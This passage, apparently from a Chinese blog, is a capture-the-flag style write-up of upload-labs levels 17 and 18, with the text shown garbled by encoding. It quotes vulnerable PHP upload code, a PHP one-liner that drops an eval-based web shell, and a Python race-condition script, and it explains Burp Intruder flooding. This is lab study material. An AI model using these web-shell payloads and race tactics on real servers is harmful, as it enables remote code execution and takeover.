ä»¥æ­¤æ¥æŸ¥è¯¢æ•°æ®ã€‚è€Œæˆ‘ä»¬å¸¸ä½¿ç”¨çš„èšå‰‘çš„åŸç†å°±æ˜¯å‘ä¸€å¥æœ¨é©¬ä¼ å…¥å¤§é‡çš„è¯­å¥ï¼Œä»¥æ­¤æ¥å¾—åˆ°è®¸å¤šçš„æƒé™ã€‚<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = false;</span><br><span class="line">$msg = null;</span><br><span class="line">if (isset($_POST[&#x27;submit&#x27;]))&#123;</span><br><span class="line">    // è·å¾—ä¸Šä¼ æ–‡ä»¶çš„åŸºæœ¬ä¿¡æ¯ï¼Œæ–‡ä»¶åï¼Œç±»å‹ï¼Œå¤§å°ï¼Œä¸´æ—¶æ–‡ä»¶è·¯å¾„</span><br><span class="line">    $filename = $_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;];</span><br><span class="line">    $filetype = $_FILES[&#x27;upload_file&#x27;][&#x27;type&#x27;];</span><br><span class="line">    $tmpname = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;];</span><br><span class="line"></span><br><span class="line">    $target_path=UPLOAD_PATH.&#x27;/&#x27;.basename($filename);</span><br><span class="line"></span><br><span class="line">    // è·å¾—ä¸Šä¼ æ–‡ä»¶çš„æ‰©å±•å</span><br><span class="line">    $fileext= substr(strrchr($filename,&quot;.&quot;),1);</span><br><span class="line"></span><br><span class="line">    //åˆ¤æ–­æ–‡ä»¶åç¼€ä¸ç±»å‹ï¼Œåˆæ³•æ‰è¿›è¡Œä¸Šä¼ æ“ä½œ</span><br><span class="line">    if(($fileext == &quot;jpg&quot;) &amp;&amp; ($filetype==&quot;image/jpeg&quot;))&#123;</span><br><span class="line">        if(move_uploaded_file($tmpname,$target_path))&#123;</span><br><span class="line">            //ä½¿ç”¨ä¸Šä¼ çš„å›¾ç‰‡ç”Ÿæˆæ–°çš„å›¾ç‰‡</span><br><span class="line">            $im = imagecreatefromjpeg($target_path);</span><br><span class="line"></span><br><span class="line">            if($im == false)&#123;</span><br><span class="line">                $msg = &quot;è¯¥æ–‡ä»¶ä¸æ˜¯jpgæ ¼å¼çš„å›¾ç‰‡ï¼&quot;;</span><br><span class="line">                @unlink($target_path);</span><br><span class="line">            &#125;else&#123;</span><br><span class="line">                //ç»™æ–°å›¾ç‰‡æŒ‡å®šæ–‡ä»¶å</span><br><span class="line">                srand(time());</span><br><span class="line">                $newfilename = strval(rand()).&quot;.jpg&quot;;</span><br><span class="line">                //æ˜¾ç¤ºäºŒæ¬¡æ¸²æŸ“åçš„å›¾ç‰‡ï¼ˆä½¿ç”¨ç”¨æˆ·ä¸Šä¼ å›¾ç‰‡ç”Ÿæˆçš„æ–°å›¾ç‰‡ï¼‰</span><br><span class="line">                $img_path = UPLOAD_PATH.&#x27;/&#x27;.$newfilename;</span><br><span class="line">                imagejpeg($im,$img_path);</span><br><span class="line">                @unlink($target_path);</span><br><span class="line">                $is_upload = true;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            $msg = &quot;ä¸Šä¼ å‡ºé”™ï¼&quot;;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;else if(($fileext == &quot;png&quot;) &amp;&amp; ($filetype==&quot;image/png&quot;))&#123;</span><br><span class="line">        if(move_uploaded_file($tmpname,$target_path))&#123;</span><br><span class="line">            //ä½¿ç”¨ä¸Šä¼ çš„å›¾ç‰‡ç”Ÿæˆæ–°çš„å›¾ç‰‡</span><br><span class="line">            $im = imagecreatefrompng($target_path);</span><br><span class="line"></span><br><span class="line">            if($im == false)&#123;</span><br><span class="line">                $msg = &quot;è¯¥æ–‡ä»¶ä¸æ˜¯pngæ ¼å¼çš„å›¾ç‰‡ï¼&quot;;</span><br><span class="line">                @unlink($target_path);</span><br><span class="line">            &#125;else&#123;</span><br><span class="line">                 //ç»™æ–°å›¾ç‰‡æŒ‡å®šæ–‡ä»¶å</span><br><span class="line">                srand(time());</span><br><span class="line">                $newfilename = strval(rand()).&quot;.png&quot;;</span><br><span class="line">                //æ˜¾ç¤ºäºŒæ¬¡æ¸²æŸ“åçš„å›¾ç‰‡ï¼ˆä½¿ç”¨ç”¨æˆ·ä¸Šä¼ å›¾ç‰‡ç”Ÿæˆçš„æ–°å›¾ç‰‡ï¼‰</span><br><span class="line">                $img_path = UPLOAD_PATH.&#x27;/&#x27;.$newfilename;</span><br><span class="line">                imagepng($im,$img_path);</span><br><span class="line"></span><br><span class="line">                @unlink($target_path);</span><br><span class="line">                $is_upload = true;               </span><br><span class="line">            &#125;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            $msg = &quot;ä¸Šä¼ å‡ºé”™ï¼&quot;;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;else if(($fileext == &quot;gif&quot;) &amp;&amp; ($filetype==&quot;image/gif&quot;))&#123;</span><br><span class="line">        if(move_uploaded_file($tmpname,$target_path))&#123;</span><br><span class="line">            //ä½¿ç”¨ä¸Šä¼ çš„å›¾ç‰‡ç”Ÿæˆæ–°çš„å›¾ç‰‡</span><br><span class="line">            $im = imagecreatefromgif($target_path);</span><br><span class="line">            if($im == false)&#123;</span><br><span class="line">                $msg = &quot;è¯¥æ–‡ä»¶ä¸æ˜¯gifæ ¼å¼çš„å›¾ç‰‡ï¼&quot;;</span><br><span class="line">                @unlink($target_path);</span><br><span class="line">            &#125;else&#123;</span><br><span class="line">                //ç»™æ–°å›¾ç‰‡æŒ‡å®šæ–‡ä»¶å</span><br><span class="line">                srand(time());</span><br><span class="line">                $newfilename = strval(rand()).&quot;.gif&quot;;</span><br><span class="line">                //æ˜¾ç¤ºäºŒæ¬¡æ¸²æŸ“åçš„å›¾ç‰‡ï¼ˆä½¿ç”¨ç”¨æˆ·ä¸Šä¼ å›¾ç‰‡ç”Ÿæˆçš„æ–°å›¾ç‰‡ï¼‰</span><br><span class="line">                $img_path = UPLOAD_PATH.&#x27;/&#x27;.$newfilename;</span><br><span class="line">                imagegif($im,$img_path);</span><br><span class="line"></span><br><span class="line">                @unlink($target_path);</span><br><span class="line">                $is_upload = true;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            $msg = &quot;ä¸Šä¼ å‡ºé”™ï¼&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        $msg = &quot;åªå…è®¸ä¸Šä¼ åç¼€ä¸º.jpg|.png|.gifçš„å›¾ç‰‡æ–‡ä»¶ï¼&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>æˆ‘ä»¬å¯¹ä¸Šè¿°ä»£ç è¿›è¡Œå®¡è®¡ï¼Œsubstr(strrchr($filename,â€.â€),1);strrchr($filename, â€œ.â€)ï¼šè¿™ä¸ªå‡½æ•°è¿”å› $filename å­—ç¬¦ä¸²ä¸­æœ€åä¸€ä¸ªç‚¹ï¼ˆ.ï¼‰åŠå…¶åé¢çš„éƒ¨åˆ†ã€‚å®ƒè¿”å›çš„æ˜¯ä»æœ€åä¸€ä¸ªç‚¹å¼€å§‹åˆ°å­—ç¬¦ä¸²æœ«å°¾çš„æ‰€æœ‰å­—ç¬¦ï¼ŒåŒ…æ‹¬ç‚¹æœ¬èº«ã€‚å¦‚æœåœ¨æ–‡ä»¶åä¸­æ‰¾ä¸åˆ°ç‚¹ï¼Œå®ƒå°†è¿”å› falseã€‚å‡½æ•°substr(str,1)æ˜¯è¿”å›ç¬¬äºŒä¸ªå¼€å§‹çš„å­—ç¬¦ä¸²</p><h2 id="imagecreatfromjpeg-target-path"><a href="#imagecreatfromjpeg-target-path" class="headerlink" title="imagecreatfromjpeg($target_path)"></a>imagecreatfromjpeg($target_path)</h2><p>è¯¥å‡½æ•°æ˜¯åˆ›å»ºä¸€ä¸ªå›¾åƒæ ‡è¯†ç¬¦ï¼Œæˆ‘ä»¬å¯ä»¥å¯¹å›¾åƒæ ‡è¯†ç¬¦è¿›è¡Œå„ç§å„æ ·çš„å›¾åƒå¤„ç†æ“ä½œå¦‚ç¼©æ”¾ã€è£å‰ªã€æ·»åŠ æ°´å°ç­‰ã€‚</p><h2 id="imagejpegï¼ˆå›¾åƒæ ‡è¯†ç¬¦ï¼Œè·¯å¾„ï¼Œæ§åˆ¶è´¨é‡ï¼‰"><a href="#imagejpegï¼ˆå›¾åƒæ ‡è¯†ç¬¦ï¼Œè·¯å¾„ï¼Œæ§åˆ¶è´¨é‡ï¼‰" class="headerlink" title="imagejpegï¼ˆå›¾åƒæ ‡è¯†ç¬¦ï¼Œè·¯å¾„ï¼Œæ§åˆ¶è´¨é‡ï¼‰"></a>imagejpegï¼ˆå›¾åƒæ ‡è¯†ç¬¦ï¼Œè·¯å¾„ï¼Œæ§åˆ¶è´¨é‡ï¼‰</h2><p>è¯¥å‡½æ•°æ˜¯å°†å›¾åƒæ ‡è¯†ç¬¦ä¿å­˜åœ¨æ–°è·¯å¾„ä¸‹,ä¿å­˜æˆåŠŸè¿”å›trueå¦åˆ™è¿”å›falseï¼Œè€Œç¬¬ä¸‰ä¸ªå‚æ•°ä¸ºæ§åˆ¶è´¨é‡ï¼Œ0æœ€å·®100æœ€å¥½è€Œé»˜è®¤å€¼ä¸º75æ˜¯ä¸€ä¸ªå¾ˆé«˜çš„å‹ç¼©ï¼Œè¿™ä¹Ÿå°±ä¼šå¯¼è‡´è¯¥å›¾åƒæ–‡ä»¶çš„äºŒè¿›åˆ¶ç¼–ç å‘ç”Ÿæ”¹å˜ï¼Œä½¿å¾—æˆ‘ä»¬çš„å›¾ç‰‡é©¬é‡Œçš„phpä»£ç çš„äºŒè¿›åˆ¶ç¼–ç ä¹Ÿå‘ç”Ÿæ”¹å˜ï¼Œä¹Ÿå°±å¯¼è‡´äº†å›¾ç‰‡é©¬çš„å¤±æ•ˆ</p><h2 id="unlink"><a href="#unlink" class="headerlink" title="unlink()"></a>unlink()</h2><p>è¯¥å‡½æ•°ä¼šåˆ é™¤æ–‡ä»¶</p><p>æ•´åˆèµ·æ¥çš„æ„æ€å°±æ˜¯è·å–ä¸Šä¼ æ–‡ä»¶çš„å›¾åƒæ ‡è¯†ç¬¦ï¼Œå°†æ ‡è¯†ç¬¦ä¿å­˜åœ¨æ–°çš„è·¯å¾„ä¸‹ï¼ˆè¿™æ ·ä¿å­˜çš„æ–‡ä»¶å°±åªå‰©ä¸‹äº†å›¾ç‰‡ï¼Œæ²¡æœ‰äº†ä¸€å¥è¯æœ¨é©¬ï¼‰ï¼Œä¹‹ååˆ é™¤åŸä¸Šä¼ æ–‡ä»¶ã€‚ä¹Ÿå°±æ˜¯å¯¹æ–‡ä»¶è¿›è¡Œäº†äºŒæ¬¡æ¸²æŸ“ï¼ŒäºŒæ¬¡æ¸²æŸ“å¯¼è‡´å›¾ç‰‡é©¬å¤±æ•ˆçš„åŸå› æ˜¯å‡½æ•°imagejpeg()å…·ä½“åŸå› åœ¨ä¸Šé¢å·²ç»è®²è¿‡äº†ã€‚</p><h2 id="é¢˜è§£-1"><a href="#é¢˜è§£-1" class="headerlink" title="é¢˜è§£"></a>é¢˜è§£</h2><p>heæˆ‘ä»¬å¯ä»¥å°è¯•ä½¿ç”¨gifçš„æ–‡ä»¶é©¬<br>åœ¨å¯¹ GIF å›¾åƒè¿›è¡ŒäºŒæ¬¡æ¸²æŸ“æ—¶ï¼Œä¿ç•™ä¸€äº›å†…å®¹çš„åŸå› å¯èƒ½ä¸ GIF å›¾åƒçš„ç‰¹æ€§æœ‰å…³ã€‚GIF æ˜¯ä¸€ç§æ”¯æŒæ— æŸå’Œæœ‰æŸå‹ç¼©çš„å›¾åƒæ ¼å¼ï¼ŒåŒæ—¶è¿˜æ”¯æŒå¤šå¸§åŠ¨ç”»ã€‚<br>ä»¥ä¸‹æ˜¯å¯èƒ½å¯¼è‡´äºŒæ¬¡æ¸²æŸ“æ—¶ä¿ç•™ä¸€äº›å†…å®¹çš„åŸå› ï¼š</p><p>æœ‰æŸå‹ç¼©ï¼š å¦‚æœåŸå§‹ GIF å›¾åƒç»è¿‡æœ‰æŸå‹ç¼©ï¼Œæ¸²æŸ“å¹¶é‡æ–°ä¿å­˜æ—¶å¯èƒ½ä¼šæŸå¤±ä¸€äº›ç»†èŠ‚ã€‚ç›¸åï¼Œå¦‚æœä½¿ç”¨æ— æŸå‹ç¼©ï¼Œåˆ™å¯èƒ½èƒ½å¤Ÿæ›´å¥½åœ°ä¿ç•™åŸå§‹å›¾åƒçš„è´¨é‡ã€‚</p><p>é¢œè‰²è¡¨å’Œè°ƒè‰²æ¿ï¼š GIF ä½¿ç”¨è°ƒè‰²æ¿ï¼ˆColor Paletteï¼‰æ¥é™åˆ¶å›¾åƒä¸­ä½¿ç”¨çš„é¢œè‰²æ•°é‡ã€‚å½“å¯¹ GIF å›¾åƒè¿›è¡Œæ¸²æŸ“æ—¶ï¼Œå¯èƒ½ä¼šé‡æ–°ç”Ÿæˆè°ƒè‰²æ¿æˆ–è€…å¯¹ç°æœ‰è°ƒè‰²æ¿è¿›è¡Œè°ƒæ•´ï¼Œå¯¼è‡´é¢œè‰²çš„å¾®å°å˜åŒ–ã€‚</p><p>å¸§åˆå¹¶ï¼š GIF å›¾åƒå¯ä»¥åŒ…å«å¤šä¸ªå¸§ï¼Œå½¢æˆåŠ¨ç”»ã€‚åœ¨é‡æ–°ä¿å­˜æ—¶ï¼Œå¯èƒ½ä¼šå¯¹è¿™äº›å¸§è¿›è¡Œä¸€äº›å¤„ç†ï¼Œä¾‹å¦‚åˆå¹¶ç›¸é‚»å¸§ä»¥å‡å°æ–‡ä»¶å¤§å°ï¼Œä½†è¿™ä¹Ÿå¯èƒ½å¯¼è‡´ä¸€äº›ç»†å¾®çš„å˜åŒ–ã€‚<br>å›¾åƒç¼–è¾‘æ“ä½œï¼š å¦‚æœåœ¨æ¸²æŸ“å‰å¯¹ GIF å›¾åƒè¿›è¡Œäº†ç¼–è¾‘ï¼Œå¦‚è£å‰ªã€è°ƒæ•´å¤§å°ã€æ·»åŠ æ–‡æœ¬ç­‰æ“ä½œï¼Œè¿™äº›æ“ä½œå¯èƒ½ä¼šå½±å“å›¾åƒå†…å®¹ã€‚</p><p>ä¸ºäº†æ›´å¥½åœ°ç†è§£ä¿ç•™å†…å®¹çš„å…·ä½“åŸå› ï¼Œå»ºè®®æ¯”è¾ƒåŸå§‹ GIF å›¾åƒå’Œç»è¿‡æ¸²æŸ“åçš„ GIF å›¾åƒçš„äºŒè¿›åˆ¶æ•°æ®ï¼Œä»¥æŸ¥çœ‹å‘ç”Ÿäº†ä»€ä¹ˆå˜åŒ–ã€‚ä½¿ç”¨äºŒè¿›åˆ¶æ–‡ä»¶æ¯”è¾ƒå·¥å…·æˆ–ç¼–ç¨‹è¯­è¨€ä¸­çš„äºŒè¿›åˆ¶æ–‡ä»¶æ¯”è¾ƒæ–¹æ³•å¯ä»¥å¸®åŠ©ä½ æ£€æµ‹å›¾åƒæ•°æ®çš„å·®å¼‚ã€‚<br>æˆ‘ä»¬å…ˆä¸Šä¼ ä¸€ä¸ªgifæ–‡ä»¶ï¼Œä½¿ç”¨010æ‰“å¼€ä¸Šä¼ åçš„æ–‡ä»¶æ‰“å¼€å¯ä»¥å‘ç°æœ‰ä¸€å¤§æ®µä¸åŸå›¾ç‰‡æ˜¯ä¸€æ¨¡ä¸€æ ·çš„ï¼Œè¿™æ ·æˆ‘ä»¬å°±å¯ä»¥å°è¯•åœ¨æœªæ”¹å˜çš„åŒºåŸŸå†™ä¸‹phpä»£ç å®ç°æ–‡ä»¶ä¸Šä¼ è·å–shell<br><img src="/2023/12/15/upload-labs/17-1.png" class="" title="Alt text"></p><h2 id="æ³•äºŒæ¡ä»¶ç«äº‰"><a href="#æ³•äºŒæ¡ä»¶ç«äº‰" class="headerlink" title="æ³•äºŒæ¡ä»¶ç«äº‰"></a>æ³•äºŒæ¡ä»¶ç«äº‰</h2><p>è¿™å…³æˆ‘ä»¬è¿˜æœ‰ç¬¬äºŒä¸ªæ–¹æ³•å°±æ˜¯åˆ©ç”¨æ¡ä»¶ç«äº‰ï¼Œæˆ‘ä»¬å®¡æŸ¥ä»£ç å¯ä»¥å‘ç°è¯¥ä»£ç æ˜¯å…ˆå°†æˆ‘ä»¬ä¸Šä¼ çš„å›¾ç‰‡é©¬è¿›è¡Œä¸€æ¬¡ä¿å­˜ï¼Œç„¶åå†æ¸²æŸ“ï¼Œæœ€åæ‰ç”¨unlinkä»£ç è¿›è¡Œåˆ é™¤ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥å°è¯•ä½¿ç”¨æ¡ä»¶ç«äº‰æ¥è¿›è¡Œç»•è¿‡ï¼Œ<br>åŸç†ä¸ºï¼Œå†çŸ­æ—¶é—´å†…å‘æœåŠ¡å™¨å‘ç”Ÿå¤šä¸ªå›¾ç‰‡é©¬ï¼Œç”±äºä»£ç çš„æ‰§è¡Œæ˜¯éœ€è¦æ—¶é—´çš„ï¼Œè€Œè¯¥ä»£ç å› ä¸ºæ²¡æœ‰é”ï¼Œå¯¼è‡´äº†å¯ä»¥åŒæ—¶è¢«æ‰§è¡Œï¼Œä¹Ÿå°±å¯¼è‡´äº†è¯¥å›¾ç‰‡é©¬è™½ç„¶è¢«åˆ é™¤ï¼Œä½†æ˜¯è¿˜å­˜åœ¨å‰ä¸€å°ç«¯æ—¶é—´å†…ä¼ å…¥çš„å›¾ç‰‡é©¬ï¼Œä¹Ÿå°±æ˜¯å›¾ç‰‡è¢«åˆ é™¤çš„åŒæ—¶åˆæ–°çš„å›¾ç‰‡é©¬è¢«ä¿å­˜ã€‚è€Œä¸”ç¬¬ä¸€æ¬¡ä¿å­˜å¹¶æ²¡æœ‰å¯¹æ–‡ä»¶åè¿›è¡Œéšæœºæ•°å¤„ç†æ‰€ä»¥æˆ‘ä»¬å¯ä»¥äº§ç”Ÿä½¿ç”¨bpè¿›è¡Œå¤šçº¿ç¨‹å‘ç”Ÿå›¾ç‰‡é©¬ï¼Œä¹‹åå°è¯•å†æµè§ˆå™¨ä¸­åŒ…å«å›¾ç‰‡é©¬ï¼Œè¯¥å›¾ç‰‡é©¬å°±æœ‰å¯ä»¥è¢«æ‰§è¡Œã€‚æˆ‘ä»¬å¯ä»¥ç”¨å¦‚ä¸‹çš„å›¾ç‰‡é©¬<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">fputs</span>(<span class="title function_ invoke__">fopen</span>(<span class="string">&#x27;..upload/muma.php&#x27;</span>,<span class="string">&#x27;w&#x27;</span>),<span class="string">&#x27;&lt;?php @eval($_POST[lisien11]);phpinfo();?&gt;&#x27;</span>);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><br>è¿™ä¸ªä»£ç çš„æ„æ€æ˜¯ä½¿ç”¨å†™å…¥æ–¹å¼æ‰“å¼€æ–‡ä»¶muma.phpå¦‚æœç›®å½•ä¸‹æ²¡æœ‰muma.php fopen()å°±ä¼šåˆ›å»ºä¸€ä¸ªmuma.phpçš„ç©ºæ–‡ä»¶ï¼Œè€Œfputsæ˜¯å°†<code>&lt;?php @eval($_POST[lisien11]);phpinfo();?&gt;</code>å†™å…¥muma.phpæ–‡ä»¶æ‰€ä»¥åªè¦è¿è¡Œè¯¥ä»£ç å°±ä¼šåœ¨uploadä¸‹å¯¼å…¥ä¸€ä¸ªmuma.phpæ–‡ä»¶ä¸‹é¢å†™ç€ä¸€å¥è¯æœ¨é©¬<br>æˆ‘ä»¬ä½¿ç”¨å¤šçº¿ç¨‹çˆ†ç ´å¯ä»¥ä½¿ç”¨bpçš„intruderæ¨¡å—æ¥è¿›è¡Œçˆ†ç ´ï¼Œæˆ‘ä»¬å°†æŠ“åˆ°çš„åŒ…å‘åˆ°intruderï¼Œæ¸…ç©ºpayloadçš„ä½ç½®ï¼Œä¹‹åå°†payloadç±»å‹è®¾ç½®ä¸ºnullè¿›è¡Œçˆ†ç ´å¤šçº¿ç¨‹å‘åŒ…<br><img src="/2023/12/15/upload-labs/17-2.png" class="" title="Alt text"><br>åœ¨å‘åŒ…çš„åŒæ—¶æˆ‘ä»¬ä½¿ç”¨pythonæ¥æ‰“å¼€ä¸€ä¸ªurlï¼Œè¯¥urlå°±æ˜¯æ–‡ä»¶åŒ…å«çš„urlè¿™æ ·åªè¦æˆåŠŸæ‰“å¼€urlå°±å¯ä»¥å°†<code>&lt;?php @eval($_POST[lisien11]);phpinfo();?&gt;</code>å†™å…¥åˆ°muam.phpé‡Œäº†ä»£ç å¦‚ä¸‹<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url=<span class="string">&quot;http://192.168.32.1/upload-labs/include.php?file=upload/muma.jpg&quot;</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span></span><br><span class="line">    html=requests.get(url)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;warning&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> <span class="built_in">str</span>(html.text)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;ok&quot;</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;no&quot;</span>)</span><br></pre></td></tr></table></figure><br>åœ¨å¼€å§‹å¤šçº¿ç¨‹å‘åŒ…åŒæ—¶åœ¨æ‰“å¼€è„šæœ¬ã€‚<br>æˆ‘åœ¨ç½‘ä¸Šçœ‹æ˜¯æœ‰äººæˆåŠŸçš„ï¼Œä½†æ˜¯å½“æˆ‘ä½¿ç”¨includeåŒ…å«æ—¶å›å‘ç”ŸæŠ¥é”™ï¼Œæœ‰å¯èƒ½æ˜¯è¯»å†™æƒé™çš„åŸå› </p><h1 id="pass-18"><a href="#pass-18" class="headerlink" title="pass-18"></a>pass-18</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$ext_arr</span> = <span class="keyword">array</span>(<span class="string">&#x27;jpg&#x27;</span>,<span class="string">&#x27;png&#x27;</span>,<span class="string">&#x27;gif&#x27;</span>);</span><br><span class="line">    <span class="variable">$file_name</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">    <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">    <span class="variable">$file_ext</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$file_name</span>,<span class="title function_ invoke__">strrpos</span>(<span class="variable">$file_name</span>,<span class="string">&quot;.&quot;</span>)+<span class="number">1</span>);</span><br><span class="line">    <span class="variable">$upload_file</span> = UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span> . <span class="variable">$file_name</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>, <span class="variable">$upload_file</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">in_array</span>(<span class="variable">$file_ext</span>,<span class="variable">$ext_arr</span>))&#123;</span><br><span class="line">             <span class="variable">$img_path</span> = UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span>. <span class="title function_ invoke__">rand</span>(<span class="number">10</span>, <span class="number">99</span>).<span class="title function_ invoke__">date</span>(<span class="string">&quot;YmdHis&quot;</span>).<span class="string">&quot;.&quot;</span>.<span class="variable">$file_ext</span>;</span><br><span class="line">             <span class="title function_ invoke__">rename</span>(<span class="variable">$upload_file</span>, <span class="variable">$img_path</span>);</span><br><span class="line">             <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&quot;åªå…è®¸ä¸Šä¼ .jpg|.png|.gifç±»å‹æ–‡ä»¶ï¼&quot;</span>;</span><br><span class="line">            <span class="title function_ invoke__">unlink</span>(<span class="variable">$upload_file</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&#x27;ä¸Šä¼ å‡ºé”™ï¼&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åˆ†ææºç <br>æˆ‘ä»¬å¯ä»¥å‘ç°è¯¥ä»£ç æ˜¯å…ˆå°†ä¸Šä¼ çš„æ–‡ä»¶ç”¨move_uploaded_file()å°†å‘é€çš„æ–‡ä»¶å…ˆä¿å­˜åœ¨æœåŠ¡å™¨ä¸Šç„¶ååœ¨æ£€æµ‹å…¶æ–‡ä»¶åç¼€ï¼Œå¦‚æœåç¼€é”™è¯¯å†ä½¿ç”¨unlinkåˆ é™¤æ–‡ä»¶ã€‚<br>æˆ‘ä»¬å¯ä»¥çœ‹å‡ºè¿™é“é¢˜ç›®æˆ‘ä»¬éœ€è¦ä½¿ç”¨æ¡ä»¶ç«äº‰æ¥å†™ã€‚æˆ‘ä»¬å¯ä»¥ä½¿ç”¨bpå‘é€å¤§é‡æ–‡ä»¶ï¼ŒæœåŠ¡å™¨åˆšåˆ é™¤ä¾¿ä¸Šä¼ ä¸€ä¸ªphpæ–‡ä»¶è€Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ä¸Šä¸€é¢˜ä¸€æ ·çš„phpæ–‡ä»¶ä»£ç ï¼Œ<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">fputs</span>(<span class="title function_ invoke__">fopen</span>(<span class="string">&#x27;..upload/muma.php&#x27;</span>,<span class="string">&#x27;w&#x27;</span>),<span class="string">&#x27;&lt;?php @eval($_POST[lisien11]);phpinfo();?&gt;&#x27;</span>);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><br>æˆ‘ä»¬åªè¦èƒ½åœ¨urlä¸Šè®¿é—®åˆ°è¯¥phpæ–‡ä»¶ï¼ŒæœåŠ¡å™¨ä¾¿ä¼šæ‰§è¡Œè¯¥æ–‡ä»¶ï¼Œè¿™æ ·å°±ä¼šå†ä¸Šä¼ ç›®å½•ä¸‹ç”Ÿæˆä¸€ä¸ªmuma.phpå†…å®¹ä¸º<code>&lt;?php @eval($_POST[lisien11]);phpinfo();?&gt;</code>çš„phpæ–‡ä»¶ã€‚<br>åŒæ„æˆ‘ä»¬å¯ä»¥ä½¿ç”¨pythonè„šæœ¬æ¥è®¿é—®è¯¥æ–‡ä»¶<br><figure class="highlight python"><table><tr><td 